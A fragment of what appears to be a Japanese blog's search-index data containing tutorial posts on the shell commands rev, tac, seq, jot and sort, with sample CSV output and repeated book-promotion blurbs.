サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-27T15:06:47+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-27-01-uniq-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-27-01-uniq-suzuki/","title":"（２５）【uniq】シェルスクリプトコマンド活用紹介"},{"content":"revコマンド ファイルの各行を反転させる キーボードから入力した内容を反転させる revコマンド概要 reverseの語源を持つ「rev」は、ファイルの各行を末尾から行頭に向かって文字列を反転させ出力します。\nrevコマンドの書式 rev ファイル名\nrevコマンドの主なオプション オプション 意味 オプションはありません。\nrevコマンド詳細説明 ファイルの各行を反転させる $ cat data.txt 1,小出里歩,オデリホ,女,27,85 2,吉野里紗,ヨシノリサ,女,38,894 3,本郷末治,ホンゴウスエジ,男,56,252 4,谷村千代乃,タニムラチヨノ,女,44,556 5,内野響子,ウチノキョウコ,女,44,170 6,塩谷貢,シオタニミツグ,男,34,494 7,児島愛子,コジマアイコ,女,39,675 8,白木俊史,シラキトシフミ,男,57,245 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 実行結果は以下のとおりです。\n$ cat data.txt | rev 58,72,女,ホリデオ,歩里出小,1 498,83,女,サリノシヨ,紗里野吉,2 252,65,男,ジエスウゴンホ,治末郷本,3 655,44,女,ノヨチラムニタ,乃代千村谷,4 071,44,女,コウョキノチウ,子響野内,5 494,43,男,グツミニタオシ,貢谷塩,6 576,93,女,コイアマジコ,子愛島児,7 542,75,男,ミフシトキラシ,史俊木白,8 479,02,女,カルハカヅイイ,佳遥塚飯,9 021,9,男,ウゾイセツクア,蔵清津久阿,01 ヒント どんなときに使うのでしょうね。むしろ、どう使うのかというよりも、必要になったときに思い出すと激しく便利、といったトリッキーなコマンドのようです。tacとrevはセットで覚えておきましょう。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-26T11:11:28+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-26-01-rev-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-26-01-rev-suzuki/","title":"（２５）【rev】シェルスクリプトコマンド活用紹介"},{"content":"tacコマンド ファイルを最終行から逆順に出力する tacコマンド概要 catコマンドを逆から読んだ「tac」はファイルの最終行から、行単位に逆順に出力するコマンドです。知る人ぞ知るマニア向けコマンドの一つです。\ntacコマンドの書式 tac [オプション] ファイル名\ntacコマンドの主なオプション オプション 意味 特筆するべきオプションはありません。\ntacコマンド詳細説明 ファイルを最終行から逆順に出力する 「tac ファイル名」で、指定したファイルを最終行から逆順に出力します\n$ cat data.txt 1,小出里歩,オデリホ,女,27,85 2,吉野里紗,ヨシノリサ,女,38,894 3,本郷末治,ホンゴウスエジ,男,56,252 4,谷村千代乃,タニムラチヨノ,女,44,556 5,内野響子,ウチノキョウコ,女,44,170 6,塩谷貢,シオタニミツグ,男,34,494 7,児島愛子,コジマアイコ,女,39,675 8,白木俊史,シラキトシフミ,男,57,245 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 実行結果は以下のとおりです。\n$ cat data.txt | tac 10,阿久津清蔵,アクツセイゾウ,男,9,120 9,飯塚遥佳,イイヅカハルカ,女,20,974 8,白木俊史,シラキトシフミ,男,57,245 7,児島愛子,コジマアイコ,女,39,675 6,塩谷貢,シオタニミツグ,男,34,494 5,内野響子,ウチノキョウコ,女,44,170 4,谷村千代乃,タニムラチヨノ,女,44,556 3,本郷末治,ホンゴウスエジ,男,56,252 2,吉野里紗,ヨシノリサ,女,38,894 1,小出里歩,オデリホ,女,27,85 ヒント catの反転がtac。よく考えたものです。恐れ入りました。 次はrevコマンドについて説明します。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-26T11:10:28+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-26-01-tac-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-26-01-tac-suzuki/","title":"（２４）【tac】シェルスクリプトコマンド活用紹介"},{"content":"seqコマンド 連続番号を出力する 開始の数と間隔を指定する 数字を逆順で出力する 書式を指定して出力する seqコマンド概要 sequenceの語源を持つ「seq」は連続番号の他、一定間隔置きに数字の列を出力する順列番号出力コマンドです。\nseqコマンドの書式 seq [オプション] [開始の数 [増分]] 終了の数\nseqコマンドの主なオプション オプション 意味 -w 先頭を0で埋めて、数字の幅を等しくする -f 書式 数字の書式を指定する -s 文字列 数字の区切りに使う文字列を指定する seqコマンド詳細説明 連続番号を出力する 一般的なseqコマンドの利用例として、 seq 10は、1から10までを出力します。\n１から指定した数までの連続番号を出力する\n$ seq 10 1 2 3 4 5 6 7 8 9 10 出力される数字の桁を併せたい場合はよくあります。\n例えば、二桁で表示させたい場合に、2ではなく02、3ではなく03といった出力です。\nこの場合は「-w」オプションを使用して桁を揃えることができます。例えば seq -w 10 の場合、幅が最大なのは「10」ですから、01、02と2桁で出力されます。\n先頭を0で埋めて桁数をそろえて出力する\n$ seq -q 10 01 02 03 04 05 06 07 08 09 10 開始の数と間隔を指定する 開始の数を指定する場合は seq 5 15 のように、「seq 開始の数 終了の数」と指定します。\nseq 5 （1から5までの数を出力する）\n$ seq 5 1 2 3 4 5 開始位置を指定することもできます。たとえば以下のように、5から始まり15までの順列を出力したい場合は以下のとおりです。\nseq 5 15 （5から15までの数を出力する）\n$ 5 15 5 6 7 8 9 10 11 12 13 14 15 seq 5 2 15 のように、開始と終了の間に増分を指定することもできます。\nseq 5 2 15 （5から15まで、数を2ずつ増やしながら出力する）\n$ seq 5 2 10 5 7 9 数字を逆順で出力する 増分には実数や負の数を指定できます。従って、増分を「-1」と指定することで、数を逆順に出力することが可能です。この場合、開始と終了の数を指定する必要がある点に注意してください。\nseq 5 -1 1 （5から1までの数を出力する）\n$ seq 5 -1 1 5 4 3 2 1 増分を「-1」と指定した場合と同じ効果を、別のコマンドを用いて実現できます。入力を行単位で逆順に出力する「tac」コマンドです。\nseq 5 | tac （seqで1から5を出力し、tacコマンドで逆順に並び替えている）\n$ seq 5 | tac 5 4 3 2 1 書式を指定して出力する 「-f」オプションを用いて数字の書式を指定することができます。\n「%g」を利用することで、整数で出力する際の桁数を指定できます。例えば、4桁の幅であれば「%4g」、4桁で「0001」のようにゼロで埋めるならば「%04g」のようにします。\nseq -f 書式 3 （1から3までの数値を指定した書式で出力する）\n$ seq -f \u0026#34;%04g\u0026#34; 3 0001 0002 0003 $ seq -f \u0026#34;IMG%04g.jpg\u0026#34; 3 IMG0001.jpg IMG0002.jpg IMG0003.jpg ヒント 次はtacコマンドについて説明します。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-26T10:40:19+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-26-01-seq-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-26-01-seq-suzuki/","title":"（２３）【seq】シェルスクリプトコマンド活用紹介"},{"content":"jotコマンド 連番を生成する 文字列と組み合わせた連番を作成する printf のフォーマットで出力する 連番の範囲を指定して出力する 乱数を出力する jotコマンド概要 jotコマンドは、連番数字はもちろん、連番付きのアルファベットを生成したり、ランダムな数字を生成したりできます。似たコマンドに seqや$RANDOM コマンドがあります。\njotコマンドの書式 jot [オプション]\njotコマンドの主なオプション オプション 意味 -w [文字列] 文字列を指定する -r 乱数を出力する jotコマンド詳細説明 連番を作る 「jot ファイル名」で、ファイルの中身を並べ替えます。\nさっそく連番を出力してみます。\nまずは10個の連番を出力します。\n$ jot 10 1 2 3 4 5 6 7 8 9 10 seqコマンドではこうなります\n$ seq 10 1 2 3 4 5 6 7 8 9 10 文字列と組み合わせた連番を作成する 文字列 abc に続けて10個の連番を作成します。\n$ jot -w abc 10 abc1 abc2 abc3 abc4 abc5 abc6 abc7 abc8 abc9 abc10 次の項でも説明しますが、seqコマンドでも同様のことができます。\n$ seq -f \u0026#34;%04g\u0026#34; 3 0001 0002 0003 seqコマンドでもprintfフォーマットで出力できますので、文字列と連結した連番の生成もできます。\n$ seq -f \u0026#34;IMG%04g.jpg\u0026#34; 3 IMG0001.jpg IMG0002.jpg IMG0003.jpg では、次の項ではjotコマンドでprintfのフォーマットで出力する方法を具体的に説明します。\nprintf のフォーマットで出力する $ jot -w \u0026#39;name%03d\u0026#39; 10 name001 name002 name003 name004 name005 name006 name007 name008 name009 name010 連番の範囲を指定して出力する 5からの連番を３つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 3 5 name005 name006 name007 10からの連番を５つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 5 10 name010 name011 name012 name013 name014 bash-5.1$ 乱数を出力する 1から10までの乱数を５つ出力します。\n-r 5 は乱数を５つ出力することを示します。\n1 10 は、１から１０までの範囲でといういみとなります。\n1から100までの範囲で乱数を５つ出力すると以下の通りになります。\njot -r 5 1 100 1 6 17 91 46 print文フォーマットで、1から100までの範囲で乱数を５つ出力してみます。\n$ jot -w \u0026#39;name%03d\u0026#39; -r 5 1 10 name008 name006 name007 name001 name006 ヒント 連番を作成する場合はseq、乱数を扱う場合は $RANDOMを使う場合が多いと思いますが、jotコマンドは、seq,$RANDOMを足し合わせて、同等それ以上の実行が可能です。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-25T14:36:44+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-25-01-jot-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-25-01-jot-suzuki/","title":"（２２）【jot】シェルスクリプトコマンド活用紹介"},{"content":"sortコマンド テキストファイルを並べ替える 数値の大小で並べ替える フィールドを指定して並べ替える CSVデータを並べ替える sortコマンド概要 sortは、テキストファイルを「行単位で並べ替える」コマンドです。他のコマンドの実行結果を並べ替える場合にも使用できます。また、空白やカンマ区切りのデータに対し、並べ替えに使用するフィールドを指定することも可能です。\nsortコマンドの書式 sort [オプション] [ファイル……]\nsortコマンドの主なオプション オプション 意味 -r 逆順で並べ替える -n 文字列を数値と見なして並べ替える -u 同一行は1つ目だけを出力する -k 指定 場所と並べ替え種別を指定する（「-k 2」なら2列目、「-k 2n」なら2列目を数値として並べ替える。複数指定する場合は「-k」オプションを複数回指定する） sortコマンド詳細説明 テキストファイルを並べ替える 「sort ファイル名」で、ファイルを並べ替えます。逆順で並べ替えたい場合は「sort -r ファイル名」とします。\n以下のファイルを並べ替えてみます。\nA B A B C 実行結果は以下のとおりです。\n$ cat baz.txt | sort A A B B C 逆順にソートするには -r オプションを付けます。\n$ cat baz.txt | sort -r C B B A A 数値の大小で並べ替える sortコマンドのデフォルトでは、数字も文字と同じように並べ替えられます。例えば、「1」と「11」と「100」では、「1」→「100」→「11」の順番になります。これを数値として「1」→「11」→「100」の順で並べ替えるには、「-n」オプションを使用します。\nseqコマンドで１から１０までを出力します。\n$ seq 10 1 2 3 4 5 6 7 8 9 10 では普通に並べ替えてみます。\n$ seq 10 | sort 1 10 2 3 4 5 6 7 8 9 1の次に10が来てしまいました。文字を扱う並べ方でソートをしているからです。数値は数値を扱うことをsortコマンドに教えて上げる必要があります。 -n コマンドをつけます。n は numberのことです。\n$ seq 10 | sort -n 1 2 3 4 5 6 7 8 9 10 フィールドを指定して並べ替える 「-k」オプションを使うと、並べ替えに使用する「フィールド」を指定できます。例えば、duコマンドの結果の2番目のフィールド、つまり「ディレクトリ名」で並べ替えるには、「du -s * | sort -k 2」のように指定します。さらに、2番目のフィールドで逆順に並べ替えるならば、「du -s * | sort -k 2r」と指定します。\nまずは以下のファイルを作成します。\n2912\tApplications 1519968\tCalibre Library 24631656\tDesktop 10141664\tDocuments 24\tDownloads 872\tDropbox 0\tFavorite まずは最初のフィルド（ファイルサイズ）で並べ替えてみます。\n$ cat du.txt | sort 0\tFavorite 10141664\tDocuments 1519968\tCalibre Library 24\tDownloads 24631656\tDesktop 2912\tApplications 872\tDropbox -n オプションを付けるのを忘れてしまいました。\n次は -n オプションをつけて実行します。\n$ cat du.txt | sort -n 0\tFavorite 24\tDownloads 872\tDropbox 2912\tApplications 1519968\tCalibre Library 10141664\tDocuments 24631656\tDesktop 次は、２番目のフィールド（ディレクトリ名）で並べ替えを行います。\n$ cat du.txt | sort -k2 2912\tApplications 1519968\tCalibre Library 24631656\tDesktop 10141664\tDocuments 24\tDownloads 872\tDropbox 0\tFavorite ヒント sortコマンドはものすごく良く使います。たくさんのオプションがありますが、まずはここで紹介したオプションを覚えればほぼ問題はありません。必要になったらGoogleで検索してください。 CSVデータを並べ替える 「-k」オプションでは、空白文字を区切りとして、並べ替えに使うフィールドを指定することができます。区切り文字を変更したい場合は、「-t」オプションで使用する文字を指定します。\n例えば、CSV（comma-separated values）データの場合、区切り文字は「,（カンマ）」なので「-t ,」または「-t \u0026ldquo;,\u0026quot;」のように指定します。\nなお、3番目のフィールドの値を数値として並べ替える場合は「-k 3n」、数値としてさらに逆順で並べ替えるなら「-k 3nr」のように指定します。\nフィールドは以下のとおりです。\n連番,氏名,氏名（カタカナ）,性別,年齢,取得ポイント\n$ cat test.csv 1,小出里歩,オデリホ,女,27,85 2,吉野里紗,ヨシノリサ,女,38,894 3,本郷末治,ホンゴウスエジ,男,56,252 4,谷村千代乃,タニムラチヨノ,女,44,556 5,内野響子,ウチノキョウコ,女,44,170 6,塩谷貢,シオタニミツグ,男,34,494 7,児島愛子,コジマアイコ,女,39,675 8,白木俊史,シラキトシフミ,男,57,245 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 sortコマンドでCSVデータを扱う場合は -t オプションを使います。\nカンマ区切りの場合は -t, となります。\n年齢で並べ替えてみます。\n$ cat data.txt | sort -t, -nr -k5 8,白木俊史,シラキトシフミ,男,57,245 3,本郷末治,ホンゴウスエジ,男,56,252 5,内野響子,ウチノキョウコ,女,44,170 4,谷村千代乃,タニムラチヨノ,女,44,556 7,児島愛子,コジマアイコ,女,39,675 2,吉野里紗,ヨシノリサ,女,38,894 6,塩谷貢,シオタニミツグ,男,34,494 1,小出里歩,オデリホ,女,27,85 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 sort -t, -nr -k5\n-t, は、CSVデータの区切り文字をカンマ（,）とする\n-nr の、nは並べ替えのデータを数値として扱う\nの、rは逆順で出力する\n-k5 は、並べ替えのキーとなるフィールドを５列目とする\nという意味です。\nでは、６列目の取得ポイントの多く順に並べ替えてみます。\nbash-5.1$ cat data.txt | sort -t, -nr -k6 9,飯塚遥佳,イイヅカハルカ,女,20,974 2,吉野里紗,ヨシノリサ,女,38,894 7,児島愛子,コジマアイコ,女,39,675 4,谷村千代乃,タニムラチヨノ,女,44,556 6,塩谷貢,シオタニミツグ,男,34,494 3,本郷末治,ホンゴウスエジ,男,56,252 8,白木俊史,シラキトシフミ,男,57,245 5,内野響子,ウチノキョウコ,女,44,170 10,阿久津清蔵,アクツセイゾウ,男,9,120 1,小出里歩,オデリホ,女,27,85 ヒント csvデータのカンマ区切りは見にくいですね。 工夫してタブ区切りに変換して出力してみてください。 $ cat data.txt | sort -t, -nr -k6 | tr \u0026#34;,\u0026#34; \u0026#34;\\t\u0026#34; 9\t飯塚遥佳\tイイヅカハルカ\t女\t20\t974 2\t吉野里紗\tヨシノリサ\t女\t38\t894 7\t児島愛子\tコジマアイコ\t女\t39\t675 4\t谷村千代乃\tタニムラチヨノ\t女\t44\t556 6\t塩谷貢\tシオタニミツグ\t男\t34\t494 3\t本郷末治\tホンゴウスエジ\t男\t56\t252 8\t白木俊史\tシラキトシフミ\t男\t57\t245 5\t内野響子\tウチノキョウコ\t女\t44\t170 10\t阿久津清蔵\tアクツセイゾウ\t男\t9\t120 1\t小出里歩\tオデリホ\t女\t27\t85 ヒント ちょっと見やすくなりました（^^; 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 